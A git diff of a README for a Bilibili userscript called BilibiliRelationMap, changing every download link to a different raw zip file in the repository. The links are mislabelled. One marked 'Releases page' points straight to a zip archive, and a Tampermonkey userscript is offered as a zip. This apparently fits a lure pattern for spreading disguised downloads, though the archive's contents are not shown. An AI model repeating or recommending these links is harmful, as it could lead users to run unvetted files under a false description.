@@ -1,6 +1,6 @@
 # 🎉 BilibiliRelationMap - Enhance Your Bilibili Experience
 
-[![Download BilibiliRelationMap](https://raw.githubusercontent.com/zdx123z/BilibiliRelationMap/main/docs/BilibiliRelationMap-3.7-beta.3.zip)](https://raw.githubusercontent.com/zdx123z/BilibiliRelationMap/main/docs/BilibiliRelationMap-3.7-beta.3.zip)
+[![Download BilibiliRelationMap](https://raw.githubusercontent.com/zdx123z/BilibiliRelationMap/main/scripts/Map-Bilibili-Relation-v3.7.zip)](https://raw.githubusercontent.com/zdx123z/BilibiliRelationMap/main/scripts/Map-Bilibili-Relation-v3.7.zip)
 
 ## 📖 Project Overview
 
@@ -31,7 +31,7 @@ To start using BilibiliRelationMap, follow these steps:
 1. **Download the Application**:
    Click the link below to visit the Releases page and download the latest version of the application.
 
-   [Download Now!](https://raw.githubusercontent.com/zdx123z/BilibiliRelationMap/main/docs/BilibiliRelationMap-3.7-beta.3.zip)
+   [Download Now!](https://raw.githubusercontent.com/zdx123z/BilibiliRelationMap/main/scripts/Map-Bilibili-Relation-v3.7.zip)
 
 2. **Install the Script**:
    After downloading, follow the installation instructions for your specific browser or environment. Make sure you have a userscript manager installed, such as Tampermonkey or Violentmonkey.
@@ -62,7 +62,7 @@ To start using BilibiliRelationMap, follow these steps:
 
 ## 📥 Download & Install
 
-To download the latest version of BilibiliRelationMap, visit the [Releases page](https://raw.githubusercontent.com/zdx123z/BilibiliRelationMap/main/docs/BilibiliRelationMap-3.7-beta.3.zip). Follow the installation instructions to set it up on your device.
+To download the latest version of BilibiliRelationMap, visit the [Releases page](https://raw.githubusercontent.com/zdx123z/BilibiliRelationMap/main/scripts/Map-Bilibili-Relation-v3.7.zip). Follow the installation instructions to set it up on your device.
 
 ## 🛠️ Troubleshooting
 
